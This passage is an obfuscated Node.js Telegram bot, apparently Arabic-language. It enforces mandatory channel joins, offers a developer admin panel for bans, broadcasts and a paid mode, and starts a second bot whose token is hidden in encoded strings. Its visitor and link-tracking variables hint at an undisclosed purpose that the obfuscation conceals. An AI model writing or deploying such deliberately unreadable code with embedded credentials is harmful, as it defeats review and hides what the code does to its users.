const _0x54266d = _0x3026;
(function (_0xd74766, _0x28e931) {
    const _0x19a177 = _0x3026, _0x20394b = _0xd74766();
    while (!![]) {
        try {
            const _0x3d4491 = parseInt(_0x19a177(0xa0e)) / (0x14 * 0x1f4 + 0x1e1 * 0x3 + -0x2cb2) * (-parseInt(_0x19a177(0x73b)) / (0xaa * 0x21 + -0xee + -0x1 * 0x14fa)) + -parseInt(_0x19a177(0x63c)) / (0xd7 * -0x2b + 0x233e * 0x1 + 0xe2) * (-parseInt(_0x19a177(0xddf)) / (-0x1 * 0x2250 + 0x691 + 0x1bc3)) + parseInt(_0x19a177(0xb23)) / (0xc27 + -0x12a * -0x5 + -0x1 * 0x11f4) * (parseInt(_0x19a177(0xdfa)) / (-0x1ce3 + 0x257c + -0x893)) + parseInt(_0x19a177(0x88d)) / (0x205e + -0x1c * -0x4 + -0x20c7) * (parseInt(_0x19a177(0x5a1)) / (0x4f4 + 0x5 * -0x101 + 0x19)) + parseInt(_0x19a177(0x646)) / (0xd5f + 0x12cd * -0x2 + 0x1844) + -parseInt(_0x19a177(0xcbc)) / (0xe3 * -0x1 + 0x7ce + -0x6e1) + -parseInt(_0x19a177(0x463)) / (0x1 * 0x19ac + -0xaaf + -0xef2);
            if (_0x3d4491 === _0x28e931)
                break;
            else
                _0x20394b['push'](_0x20394b['shift']());
        } catch (_0x438b38) {
            _0x20394b['push'](_0x20394b['shift']());
        }
    }
}(_0x43fe, -0x8 * 0x57e2 + -0x128f0 + 0xcf5a9), require(_0x54266d(0x827))[_0x54266d(0x2e5)]());
const TelegramBot = require(_0x54266d(0x40e) + _0x54266d(0x3e3) + 'i'), express = require(_0x54266d(0x86b)), bodyParser = require(_0x54266d(0x5eb) + 'r'), multer = require(_0x54266d(0xbd7)), path = require(_0x54266d(0x55d)), fs = require('fs'), {DateTime, Duration} = require(_0x54266d(0xa10)), fetch = require(_0x54266d(0xa90)), crypto = require(_0x54266d(0x301)), axios = require(_0x54266d(0x46e)), uuid = require(_0x54266d(0xb45)), {randomInt} = require(_0x54266d(0x301)), {Readable} = require(_0x54266d(0x3d2)), cheerio = require(_0x54266d(0xdf4)), dns = require(_0x54266d(0x3cb)), sleep = _0x3777a0 => new Promise(_0x3ec905 => setTimeout(_0x3ec905, _0x3777a0)), tmo = process[_0x54266d(0xd4b)]['is'], botToken = process[_0x54266d(0xd4b)]['n'], botUsername = process[_0x54266d(0xd4b)][_0x54266d(0x9e3)], bot = new TelegramBot(botToken, { 'polling': !![] }), developerId = -0x11344e2e * 0x25 + 0xa0cff85 * 0x41 + -0x145559b9b * -0x1;
let mandatoryChannels = [
        _0x54266d(0x785),
        _0x54266d(0x253),
        _0x54266d(0x6de),
        _0x54266d(0x65a),
        _0x54266d(0x62d)
    ], bannedUsers = [], subscribers = [], isPaidBot = ![];
function isDeveloper(_0x4d2bc8) {
    const _0x4a55f0 = _0x54266d, _0x58fb93 = {
            'cZCeR': function (_0x3f7234, _0x33e420) {
                return _0x3f7234 === _0x33e420;
            }
        };
    return _0x58fb93[_0x4a55f0(0x68d)](_0x4d2bc8, developerId);
}
async function checkUserSubscription(_0x162e7a) {
    const _0xa36db6 = _0x54266d, _0x49eaba = {
            'fQSDC': function (_0x1e1de0, _0x3b292c) {
                return _0x1e1de0 === _0x3b292c;
            },
            'qUzuI': _0xa36db6(0x397),
            'FPDnc': function (_0x558e98, _0xde9ae2) {
                return _0x558e98 === _0xde9ae2;
            },
            'LSHLB': _0xa36db6(0x6e3)
        };
    for (let _0x59d502 of mandatoryChannels) {
        try {
            let _0x1189dd = await bot[_0xa36db6(0x5d7) + _0xa36db6(0x1fd)](_0x59d502, _0x162e7a);
            if (_0x49eaba[_0xa36db6(0x897)](_0x1189dd[_0xa36db6(0x972)], _0x49eaba[_0xa36db6(0x731)]) || _0x49eaba[_0xa36db6(0x9a8)](_0x1189dd[_0xa36db6(0x972)], _0x49eaba[_0xa36db6(0x60b)]))
                return ![];
        } catch (_0x42aade) {
            return console[_0xa36db6(0xb18)](_0xa36db6(0x750) + _0xa36db6(0xcb3) + _0xa36db6(0xb5c) + _0xa36db6(0xb26) + _0x59d502 + ':', _0x42aade), ![];
        }
    }
    return !![];
}
async function showSubscriptionButtons(_0x4bfbdf) {
    const _0x5d89e4 = _0x54266d, _0x58da8d = { 'IqAru': _0x5d89e4(0x39a) + _0x5d89e4(0xcb5) + _0x5d89e4(0x6a7) + _0x5d89e4(0x27f) + _0x5d89e4(0x776) + _0x5d89e4(0x4ed) }, _0x86daa0 = _0x58da8d[_0x5d89e4(0xb41)], _0x4b2d8c = mandatoryChannels[_0x5d89e4(0x79b)](_0x40c3c9 => [{
                'text': _0x5d89e4(0xa5a) + _0x40c3c9,
                'url': _0x5d89e4(0xcd2) + _0x5d89e4(0x3f3) + _0x40c3c9[_0x5d89e4(0xca7)](0x9 * -0x1c3 + -0xd6 * 0x3 + 0x125e)
            }]);
    await bot[_0x5d89e4(0x741) + 'e'](_0x4bfbdf, _0x86daa0, { 'reply_markup': { 'inline_keyboard': _0x4b2d8c } });
}
bot[_0x54266d(0xb39)](/\/start/, async _0x96d580 => {
    const _0x649984 = _0x54266d, _0x22d096 = {
            'oEWiL': _0x649984(0x6e7) + _0x649984(0xc52) + _0x649984(0x85f) + _0x649984(0xcf5) + _0x649984(0x3d1) + _0x649984(0x328) + _0x649984(0x85c) + _0x649984(0xbfa) + '12',
            'aznVc': _0x649984(0x447) + _0x649984(0x6bc) + _0x649984(0x586) + '.',
            'rXQdD': function (_0x1915b6, _0x1cfef8) {
                return _0x1915b6(_0x1cfef8);
            },
            'GtjqO': _0x649984(0xb3c) + _0x649984(0x8b1) + _0x649984(0x4af),
            'DaRQn': _0x649984(0x3fb) + _0x649984(0x856) + _0x649984(0xda7),
            'JNnIa': _0x649984(0x3fb) + _0x649984(0x255) + _0x649984(0x734),
            'tRbTv': _0x649984(0xcb1) + _0x649984(0x36d),
            'AmkNh': _0x649984(0xd1b) + _0x649984(0x8f1),
            'YPYOV': _0x649984(0x39d) + _0x649984(0xc4a) + _0x649984(0x588),
            'YxEqS': _0x649984(0x935) + 's',
            'PzJPC': _0x649984(0x7b2) + _0x649984(0x225),
            'GmAwV': _0x649984(0xd24) + _0x649984(0xc1d),
            'YCskL': _0x649984(0x2a7) + _0x649984(0x188),
            'mtzFP': _0x649984(0x516) + _0x649984(0x5cb),
            'nKDUJ': _0x649984(0x62c) + _0x649984(0x427),
            'wxoTk': _0x649984(0x27e) + _0x649984(0x5de),
            'MKkyD': _0x649984(0x942) + _0x649984(0x31c),
            'vkOSU': _0x649984(0x6b1),
            'DwKds': _0x649984(0xad6) + _0x649984(0x330),
            'TWwrX': _0x649984(0xbbe) + 're',
            'VMBCY': _0x649984(0x83f) + _0x649984(0x2c7),
            'EXcyA': _0x649984(0xa4c),
            'DHlIB': _0x649984(0x1b8) + _0x649984(0xc1e),
            'Pjtoh': _0x649984(0xacb) + _0x649984(0x6b4),
            'NqLNP': _0x649984(0xadd) + _0x649984(0x92e) + _0x649984(0xa91) + _0x649984(0xb4a) + _0x649984(0x4d5),
            'UAgym': _0x649984(0xb0e) + _0x649984(0xd14),
            'rAkBQ': _0x649984(0x59b) + _0x649984(0x6df),
            'rHmlm': _0x649984(0x7e9) + _0x649984(0xe07),
            'jJQLI': _0x649984(0x7de) + _0x649984(0x216) + _0x649984(0xc05) + _0x649984(0xb4e) + _0x649984(0x3f3),
            'GqHHf': _0x649984(0x7b1) + _0x649984(0x3f9),
            'LZreh': _0x649984(0x319),
            'pSHeU': _0x649984(0x6ec) + _0x649984(0x96a) + _0x649984(0x6ee),
            'WjqPt': _0x649984(0xd17),
            'EwUGO': _0x649984(0x4fe) + _0x649984(0x3f7),
            'SwfWY': _0x649984(0x1c3) + _0x649984(0x48d) + _0x649984(0xad7) + _0x649984(0x22f) + _0x649984(0x2d1),
            'mLoWB': _0x649984(0xbb2) + _0x649984(0xaeb),
            'ViUFb': _0x649984(0xcd2) + _0x649984(0x757) + '3',
            'KgGEs': _0x649984(0xbd9) + _0x649984(0xc80),
            'kljVL': _0x649984(0x1ff) + _0x649984(0xccf) + _0x649984(0xc9b) + _0x649984(0x5d3) + 'e/',
            'DEGgh': _0x649984(0x57e) + _0x649984(0x90e),
            'MQgNL': _0x649984(0x481) + 'il',
            'nVBoq': _0x649984(0x982) + '💳',
            'Sekzm': _0x649984(0x98c) + _0x649984(0xe13),
            'qOlZe': _0x649984(0x2d0) + _0x649984(0x647),
            'aOgCD': _0x649984(0x63d) + _0x649984(0x7f8),
            'qoVNk': _0x649984(0x72b) + _0x649984(0x5f3),
            'lrWlc': _0x649984(0xa99) + _0x649984(0x384),
            'JlEDY': _0x649984(0xe17) + _0x649984(0x312),
            'phLOE': _0x649984(0x72a),
            'wPADw': _0x649984(0xdea) + _0x649984(0x5f7),
            'zocwB': _0x649984(0x7be) + 's',
            'BXFGu': _0x649984(0x9da) + _0x649984(0xbda),
            'bEVdU': _0x649984(0xb4f) + _0x649984(0x3ba),
            'DgwbG': _0x649984(0xc1b) + _0x649984(0xd05),
            'LVhHg': _0x649984(0x71f),
            'cstNL': _0x649984(0x969) + _0x649984(0x3cc),
            'caXjc': _0x649984(0x5d6) + _0x649984(0xa24) + '0',
            'xMRag': _0x649984(0xc7d) + _0x649984(0xa8b),
            'kjskX': _0x649984(0x84d),
            'UQFPn': _0x649984(0x788) + _0x649984(0xb82),
            'GJyCe': _0x649984(0x7fc) + 'xt',
            'SHwNX': _0x649984(0xdc7) + _0x649984(0xdad),
            'KcNqZ': _0x649984(0x428) + 'e',
            'AwZvB': _0x649984(0xacb) + _0x649984(0xdf5),
            'HiSvV': _0x649984(0x90d) + _0x649984(0xdf2),
            'aQFzG': _0x649984(0xe17) + _0x649984(0x509),
            'SpBxy': _0x649984(0xd95) + _0x649984(0x403),
            'vFxtc': _0x649984(0x4a6) + _0x649984(0xa98) + '\x20⛔',
            'ONUcQ': _0x649984(0x76b) + 'ة',
            'qEbfm': _0x649984(0xcd1) + _0x649984(0x1e9),
            'qRYpl': _0x649984(0xe19) + _0x649984(0x316),
            'hkQlP': _0x649984(0x454) + _0x649984(0xe07),
            'KDZNS': _0x649984(0x7ab),
            'GrAac': _0x649984(0x553) + _0x649984(0x232) + '✨'
        }, _0x421ef8 = _0x96d580[_0x649984(0x6a9)]['id'];
    if (isPaidBot) {
        bot[_0x649984(0x741) + 'e'](_0x421ef8, _0x22d096[_0x649984(0x1b5)]);
        return;
    }
    if (bannedUsers[_0x649984(0x439)](_0x421ef8)) {
        bot[_0x649984(0x741) + 'e'](_0x421ef8, _0x22d096[_0x649984(0x34a)]);
        return;
    }
    const _0x1cab7c = await _0x22d096[_0x649984(0x61f)](checkUserSubscription, _0x421ef8);
    if (!_0x1cab7c) {
        await _0x22d096[_0x649984(0x61f)](showSubscriptionButtons, _0x421ef8);
        return;
    }
    !subscribers[_0x649984(0x439)](_0x421ef8) && subscribers[_0x649984(0xb97)](_0x421ef8);
    const _0x4e5d3b = _0x22d096[_0x649984(0x852)], _0x1f8987 = [
            [
                {
                    'text': _0x22d096[_0x649984(0xb9c)],
                    'callback_data': _0x649984(0xe29) + _0x649984(0x49c) + _0x421ef8
                },
                {
                    'text': _0x22d096[_0x649984(0x8a3)],
                    'callback_data': _0x649984(0xab5) + 'k:' + _0x421ef8
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0xa01)],
                    'callback_data': _0x649984(0x9e6) + 'n:' + _0x421ef8
                },
                {
                    'text': _0x22d096[_0x649984(0x1bf)],
                    'callback_data': _0x649984(0x73d) + 'e:' + _0x421ef8
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x218)],
                    'callback_data': _0x22d096[_0x649984(0x8c3)]
                },
                {
                    'text': _0x22d096[_0x649984(0x458)],
                    'callback_data': _0x22d096[_0x649984(0x389)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x762)],
                    'callback_data': _0x22d096[_0x649984(0x50b)]
                },
                {
                    'text': _0x22d096[_0x649984(0x9f4)],
                    'callback_data': _0x649984(0x5c5) + _0x649984(0xd5a) + _0x421ef8
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x5e4)],
                    'callback_data': _0x649984(0xe15) + _0x649984(0xc11) + _0x421ef8
                },
                {
                    'text': _0x22d096[_0x649984(0x9e8)],
                    'callback_data': _0x22d096[_0x649984(0x8f9)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0xac3)],
                    'callback_data': _0x22d096[_0x649984(0xbe3)]
                },
                {
                    'text': _0x22d096[_0x649984(0xc3d)],
                    'callback_data': _0x22d096[_0x649984(0x9bd)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x4fd)],
                    'callback_data': _0x649984(0xd48) + 'k:' + _0x421ef8
                },
                {
                    'text': _0x22d096[_0x649984(0xd25)],
                    'web_app': { 'url': _0x22d096[_0x649984(0x3a0)] }
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x266)],
                    'callback_data': _0x22d096[_0x649984(0xbc8)]
                },
                {
                    'text': _0x22d096[_0x649984(0xa1c)],
                    'web_app': { 'url': _0x22d096[_0x649984(0xa23)] }
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0xde2)],
                    'callback_data': _0x22d096[_0x649984(0x259)]
                },
                {
                    'text': _0x22d096[_0x649984(0x424)],
                    'callback_data': _0x22d096[_0x649984(0xd80)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0xd29)],
                    'web_app': { 'url': _0x22d096[_0x649984(0xd6f)] }
                },
                {
                    'text': _0x22d096[_0x649984(0x8ff)],
                    'url': _0x22d096[_0x649984(0xc03)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x40b)],
                    'web_app': { 'url': _0x22d096[_0x649984(0x754)] }
                },
                {
                    'text': _0x22d096[_0x649984(0x43e)],
                    'callback_data': _0x22d096[_0x649984(0x4e6)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x398)],
                    'callback_data': _0x22d096[_0x649984(0x970)]
                },
                {
                    'text': _0x22d096[_0x649984(0x3b0)],
                    'callback_data': _0x22d096[_0x649984(0x960)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x8f3)],
                    'callback_data': _0x22d096[_0x649984(0x6af)]
                },
                {
                    'text': _0x22d096[_0x649984(0xc72)],
                    'callback_data': _0x22d096[_0x649984(0x642)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0xb0c)],
                    'callback_data': _0x22d096[_0x649984(0x1ed)]
                },
                {
                    'text': _0x22d096[_0x649984(0x904)],
                    'callback_data': _0x22d096[_0x649984(0xc0a)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0xca6)],
                    'callback_data': _0x22d096[_0x649984(0xc12)]
                },
                {
                    'text': _0x22d096[_0x649984(0x260)],
                    'callback_data': _0x22d096[_0x649984(0x29a)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0xcdc)],
                    'callback_data': _0x22d096[_0x649984(0x3de)]
                },
                {
                    'text': _0x22d096[_0x649984(0x6fc)],
                    'callback_data': _0x22d096[_0x649984(0xe2a)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x65c)],
                    'callback_data': _0x22d096[_0x649984(0x82e)]
                },
                {
                    'text': _0x22d096[_0x649984(0xd91)],
                    'callback_data': _0x22d096[_0x649984(0xbae)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0x30b)],
                    'callback_data': _0x22d096[_0x649984(0xa7e)]
                },
                {
                    'text': _0x22d096[_0x649984(0x753)],
                    'callback_data': _0x22d096[_0x649984(0x4d8)]
                }
            ],
            [
                {
                    'text': _0x22d096[_0x649984(0xb0a)],
                    'callback_data': _0x22d096[_0x649984(0x3c6)]
                },
                {
                    'text': _0x22d096[_0x649984(0x6dc)],
                    'callback_data': _0x22d096[_0x649984(0xd89)]
                }
            ],
            [{
                    'text': _0x22d096[_0x649984(0xdec)],
                    'callback_data': 'ai'
                }]
        ];
    await bot[_0x649984(0x741) + 'e'](_0x421ef8, _0x4e5d3b, { 'reply_markup': { 'inline_keyboard': _0x1f8987 } });
});
const sessionState = {
    'banUser': ![],
    'unbanUser': ![],
    'broadcast': ![],
    'addChannel': ![],
    'removeChannel': ![]
};
function sendAdminPanel(_0x149fb6) {
    const _0x3f98d0 = _0x54266d, _0x5cfd38 = {
            'LZjyk': function (_0x1fdb7c, _0x5ddb49) {
                return _0x1fdb7c === _0x5ddb49;
            },
            'tSnBy': _0x3f98d0(0x75d),
            'tHjXs': _0x3f98d0(0xe00),
            'QJORP': _0x3f98d0(0x99f) + _0x3f98d0(0x306),
            'wRung': _0x3f98d0(0xc5b),
            'alomK': _0x3f98d0(0xc8f) + 'ة',
            'taEFw': _0x3f98d0(0x593),
            'xxxTB': _0x3f98d0(0x9ea) + _0x3f98d0(0xa94) + _0x3f98d0(0x3ae),
            'QorTM': _0x3f98d0(0xbe2) + 'l',
            'sLoZx': _0x3f98d0(0x923) + _0x3f98d0(0x986) + _0x3f98d0(0x65b),
            'JxsTQ': _0x3f98d0(0xd5f) + _0x3f98d0(0xc9c),
            'KCXGl': _0x3f98d0(0x862) + _0x3f98d0(0x64a) + 'ع',
            'kODbP': _0x3f98d0(0xab7),
            'zTzky': _0x3f98d0(0xdb7) + _0x3f98d0(0xa37),
            'QzykK': _0x3f98d0(0x9d3),
            'RoITl': _0x3f98d0(0xbb8) + _0x3f98d0(0x3cf)
        };
    if (_0x5cfd38[_0x3f98d0(0x208)](_0x149fb6, developerId)) {
        const _0x3624e8 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x5cfd38[_0x3f98d0(0x5f2)],
                            'callback_data': _0x5cfd38[_0x3f98d0(0x780)]
                        }],
                    [{
                            'text': _0x5cfd38[_0x3f98d0(0x25e)],
                            'callback_data': _0x5cfd38[_0x3f98d0(0x82f)]
                        }],
                    [{
                            'text': _0x5cfd38[_0x3f98d0(0xc3a)],
                            'callback_data': _0x5cfd38[_0x3f98d0(0xd22)]
                        }],
                    [{
                            'text': _0x5cfd38[_0x3f98d0(0x6ba)],
                            'callback_data': _0x5cfd38[_0x3f98d0(0xb50)]
                        }],
                    [{
                            'text': _0x5cfd38[_0x3f98d0(0xbb5)],
                            'callback_data': _0x5cfd38[_0x3f98d0(0x84c)]
                        }],
                    [{
                            'text': _0x5cfd38[_0x3f98d0(0x965)],
                            'callback_data': _0x5cfd38[_0x3f98d0(0x812)]
                        }],
                    [{
                            'text': _0x5cfd38[_0x3f98d0(0x2e3)],
                            'callback_data': _0x5cfd38[_0x3f98d0(0x562)]
                        }]
                ]
            }
        };
        bot[_0x3f98d0(0x741) + 'e'](_0x149fb6, _0x5cfd38[_0x3f98d0(0xa19)], _0x3624e8);
    }
}
bot['on'](_0x54266d(0x842), _0x325ca3 => {
    const _0x24fa10 = _0x54266d, _0x5656a3 = {
            'rVZNE': function (_0xd792bc, _0x1ffbbf) {
                return _0xd792bc !== _0x1ffbbf;
            },
            'tFVru': function (_0x3c6b07, _0x4000ca) {
                return _0x3c6b07(_0x4000ca);
            },
            'BHJIP': function (_0x35dafb, _0x277829) {
                return _0x35dafb(_0x277829);
            },
            'TdSjA': _0x24fa10(0xb2e) + _0x24fa10(0xe10) + _0x24fa10(0xb2c) + _0x24fa10(0x83d)
        }, _0x3c4132 = _0x325ca3[_0x24fa10(0x6a9)]['id'];
    if (_0x5656a3[_0x24fa10(0x360)](_0x3c4132, developerId))
        return;
    if (sessionState[_0x24fa10(0x90c)]) {
        const _0x21b43f = _0x5656a3[_0x24fa10(0x6e6)](parseInt, _0x325ca3[_0x24fa10(0x9ac)]);
        bannedUsers[_0x24fa10(0xb97)](_0x21b43f), bot[_0x24fa10(0x741) + 'e'](_0x3c4132, _0x24fa10(0x1d8) + _0x24fa10(0x89f) + _0x21b43f), sessionState[_0x24fa10(0x90c)] = ![];
    } else {
        if (sessionState[_0x24fa10(0x362)]) {
            const _0x22e774 = _0x5656a3[_0x24fa10(0x844)](parseInt, _0x325ca3[_0x24fa10(0x9ac)]);
            bannedUsers = bannedUsers[_0x24fa10(0xbea)](_0x1bcaeb => _0x1bcaeb !== _0x22e774), bot[_0x24fa10(0x741) + 'e'](_0x3c4132, _0x24fa10(0xa3d) + _0x24fa10(0x984) + _0x24fa10(0x396) + _0x22e774), sessionState[_0x24fa10(0x362)] = ![];
        } else {
            if (sessionState[_0x24fa10(0x593)])
                subscribers[_0x24fa10(0xcba)](_0x2a1499 => {
                    const _0x4139cf = _0x24fa10;
                    bot[_0x4139cf(0x741) + 'e'](_0x2a1499, _0x325ca3[_0x4139cf(0x9ac)]);
                }), bot[_0x24fa10(0x741) + 'e'](_0x3c4132, _0x5656a3[_0x24fa10(0xc00)]), sessionState[_0x24fa10(0x593)] = ![];
            else {
                if (sessionState[_0x24fa10(0x200)]) {
                    const _0xa4dfd2 = _0x325ca3[_0x24fa10(0x9ac)];
                    mandatoryChannels[_0x24fa10(0xb97)](_0xa4dfd2), bot[_0x24fa10(0x741) + 'e'](_0x3c4132, _0x24fa10(0xc77) + _0x24fa10(0xa39) + _0x24fa10(0xba4) + _0x24fa10(0xe0f) + _0xa4dfd2), sessionState[_0x24fa10(0x200)] = ![];
                } else {
                    if (sessionState[_0x24fa10(0x1f3) + _0x24fa10(0xaf2)]) {
                        const _0x5da9dd = _0x325ca3[_0x24fa10(0x9ac)];
                        mandatoryChannels = mandatoryChannels[_0x24fa10(0xbea)](_0x4817d8 => _0x4817d8 !== _0x5da9dd), bot[_0x24fa10(0x741) + 'e'](_0x3c4132, _0x24fa10(0xa5b) + _0x24fa10(0xa39) + _0x24fa10(0xba4) + _0x24fa10(0xe0f) + _0x5da9dd), sessionState[_0x24fa10(0x1f3) + _0x24fa10(0xaf2)] = ![];
                    }
                }
            }
        }
    }
}), bot[_0x54266d(0xb39)](/\/mm/, _0x1e75e4 => {
    const _0x193c98 = _0x54266d, _0x308046 = {
            'cUKGY': function (_0x29cd35, _0x376631) {
                return _0x29cd35 === _0x376631;
            },
            'XgVkf': function (_0x1ebe5b, _0x2af255) {
                return _0x1ebe5b(_0x2af255);
            },
            'FnbXh': _0x193c98(0x251) + _0x193c98(0x8e8)
        }, _0x2e99fa = _0x1e75e4[_0x193c98(0x6a9)]['id'];
    _0x308046[_0x193c98(0x23c)](_0x2e99fa, developerId) ? _0x308046[_0x193c98(0xca9)](sendAdminPanel, _0x2e99fa) : bot[_0x193c98(0x741) + 'e'](_0x2e99fa, _0x308046[_0x193c98(0x51a)]);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x400387 => {
    const _0x2f4341 = _0x54266d, _0x1f16a5 = {
            'peCgP': function (_0x1489fa, _0x1087a7) {
                return _0x1489fa === _0x1087a7;
            },
            'xcLeO': _0x2f4341(0xe00),
            'pBjGZ': _0x2f4341(0xbb1) + _0x2f4341(0x6f0) + _0x2f4341(0xa7b) + _0x2f4341(0xcc9),
            'GUOoj': _0x2f4341(0xc5b),
            'SfmPV': _0x2f4341(0xbb1) + _0x2f4341(0x6f0) + _0x2f4341(0x583) + _0x2f4341(0x337),
            'cnrmZ': _0x2f4341(0x593),
            'OFjCi': _0x2f4341(0x9f2) + _0x2f4341(0x44c) + _0x2f4341(0x280) + _0x2f4341(0x3d9) + _0x2f4341(0xd84),
            'jpMKL': _0x2f4341(0xbe2) + 'l',
            'uYExv': _0x2f4341(0xbb1) + _0x2f4341(0x7d0) + _0x2f4341(0x807) + _0x2f4341(0xac0) + _0x2f4341(0xa64) + _0x2f4341(0xad0),
            'XelQn': _0x2f4341(0xd5f) + _0x2f4341(0xc9c),
            'SafgI': _0x2f4341(0xbb1) + _0x2f4341(0xb76) + _0x2f4341(0xcf9) + _0x2f4341(0x1b9) + _0x2f4341(0x46a) + _0x2f4341(0xba4) + 'ي:',
            'chxrl': _0x2f4341(0xab7),
            'WVCuc': _0x2f4341(0xb08) + _0x2f4341(0x662) + _0x2f4341(0x43a),
            'bJNav': _0x2f4341(0x9d3),
            'vWWxz': _0x2f4341(0x2b4) + _0x2f4341(0xe20)
        }, _0x33ea1c = _0x400387[_0x2f4341(0x842)][_0x2f4341(0x6a9)]['id'], _0x14be5e = _0x400387[_0x2f4341(0x50f)];
    if (_0x1f16a5[_0x2f4341(0xc4e)](_0x33ea1c, developerId))
        switch (_0x14be5e) {
        case _0x1f16a5[_0x2f4341(0x537)]:
            bot[_0x2f4341(0x741) + 'e'](_0x33ea1c, _0x1f16a5[_0x2f4341(0x69f)]), sessionState[_0x2f4341(0x90c)] = !![];
            break;
        case _0x1f16a5[_0x2f4341(0x96d)]:
            bot[_0x2f4341(0x741) + 'e'](_0x33ea1c, _0x1f16a5[_0x2f4341(0xe26)]), sessionState[_0x2f4341(0x362)] = !![];
            break;
        case _0x1f16a5[_0x2f4341(0x869)]:
            bot[_0x2f4341(0x741) + 'e'](_0x33ea1c, _0x1f16a5[_0x2f4341(0x3a9)]), sessionState[_0x2f4341(0x593)] = !![];
            break;
        case _0x1f16a5[_0x2f4341(0x9c7)]:
            bot[_0x2f4341(0x741) + 'e'](_0x33ea1c, _0x1f16a5[_0x2f4341(0x4ce)]), sessionState[_0x2f4341(0x200)] = !![];
            break;
        case _0x1f16a5[_0x2f4341(0x628)]:
            bot[_0x2f4341(0x741) + 'e'](_0x33ea1c, _0x1f16a5[_0x2f4341(0xbd6)]), sessionState[_0x2f4341(0x1f3) + _0x2f4341(0xaf2)] = !![];
            break;
        case _0x1f16a5[_0x2f4341(0x8db)]:
            isPaidBot = !![], bot[_0x2f4341(0x741) + 'e'](_0x33ea1c, _0x1f16a5[_0x2f4341(0x3b2)]);
            break;
        case _0x1f16a5[_0x2f4341(0x311)]:
            isPaidBot = ![], bot[_0x2f4341(0x741) + 'e'](_0x33ea1c, _0x1f16a5[_0x2f4341(0x695)]);
            break;
        }
}), bot['on'](_0x54266d(0x375) + _0x54266d(0x3c1), _0x23c5c1 => {
    const _0x45571c = _0x54266d;
    console[_0x45571c(0xb18)](_0x23c5c1);
});
const SECOND_BOT_TOKEN = _0x54266d(0xdd2) + _0x54266d(0xdcd) + _0x54266d(0x371) + _0x54266d(0xb1d) + _0x54266d(0x7da), secondBot = new TelegramBot(SECOND_BOT_TOKEN, { 'polling': !![] });
let inviteLinks = {}, userPoints = {}, linkData = {}, visitorData = {};
async function isUserSubscribed(_0x3cd8a9) {
    const _0x426127 = _0x54266d, _0x4bd2c4 = {
            'ReesR': function (_0x4b7a1e, _0x379f01) {
                return _0x4b7a1e === _0x379f01;
            },
            'LORxT': _0x426127(0x2f9),
            'xrxSe': _0x426127(0xb38) + _0x426127(0x676),
            'fLMZI': function (_0x3ee97e, _0x5588eb) {
                return _0x3ee97e === _0x5588eb;
            },
            'qppvB': _0x426127(0x5c1),
            'duneP': _0x426127(0x750) + _0x426127(0xcb3) + _0x426127(0x8ac) + _0x426127(0x765)
        };
    try {
        const _0x205420 = await Promise[_0x426127(0x351)](mandatoryChannels[_0x426127(0x79b)](_0x445574 => bot[_0x426127(0x5d7) + _0x426127(0x1fd)](_0x445574, _0x3cd8a9)));
        return _0x205420[_0x426127(0x284)](_0x1d1c72 => {
            const _0x5d9c1c = _0x426127, _0x350a26 = _0x1d1c72[_0x5d9c1c(0x972)];
            return _0x4bd2c4[_0x5d9c1c(0x838)](_0x350a26, _0x4bd2c4[_0x5d9c1c(0x3f4)]) || _0x4bd2c4[_0x5d9c1c(0x838)](_0x350a26, _0x4bd2c4[_0x5d9c1c(0xb6b)]) || _0x4bd2c4[_0x5d9c1c(0x8df)](_0x350a26, _0x4bd2c4[_0x5d9c1c(0xa13)]);
        });
    } catch (_0x5c1c48) {
        return console[_0x426127(0x3a5)](_0x4bd2c4[_0x426127(0x2d8)], _0x5c1c48), ![];
    }
}
function _0x3026(_0x47d4a3, _0x621e19) {
    const _0x76d6cd = _0x43fe();
    return _0x3026 = function (_0x28bc0d, _0x272d2f) {
        _0x28bc0d = _0x28bc0d - (0x1 * 0x5d9 + 0x1 * 0xb92 + 0x1 * -0xfe7);
        let _0x9b2bbc = _0x76d6cd[_0x28bc0d];
        return _0x9b2bbc;
    }, _0x3026(_0x47d4a3, _0x621e19);
}
bot[_0x54266d(0xb39)](/\/Vip/, async _0x1093e8 => {
    const _0x4e7548 = _0x54266d, _0x32336c = {
            'sUUxl': function (_0x445fc7, _0x2c8016) {
                return _0x445fc7(_0x2c8016);
            },
            'ivcwx': _0x4e7548(0x39a) + _0x4e7548(0xcb5) + _0x4e7548(0x6a7) + _0x4e7548(0x27f) + _0x4e7548(0x776) + _0x4e7548(0x4ed),
            'IAtlu': _0x4e7548(0x43f) + _0x4e7548(0x471) + _0x4e7548(0xcc7) + _0x4e7548(0xb46) + _0x4e7548(0x989) + _0x4e7548(0x366) + _0x4e7548(0xa3f) + '.',
            'mKMdz': _0x4e7548(0xd28) + _0x4e7548(0x7b9) + _0x4e7548(0x779),
            'SyIfr': _0x4e7548(0x87a) + _0x4e7548(0xa97) + _0x4e7548(0x607) + _0x4e7548(0xd40),
            'bcgCd': _0x4e7548(0x54a) + _0x4e7548(0x412) + _0x4e7548(0x22e) + _0x4e7548(0x4bb),
            'CoNwY': _0x4e7548(0x289) + _0x4e7548(0x865) + _0x4e7548(0x638),
            'ecWTF': _0x4e7548(0xc1a) + _0x4e7548(0x32e),
            'vXTOg': _0x4e7548(0xc1a) + _0x4e7548(0x4b8)
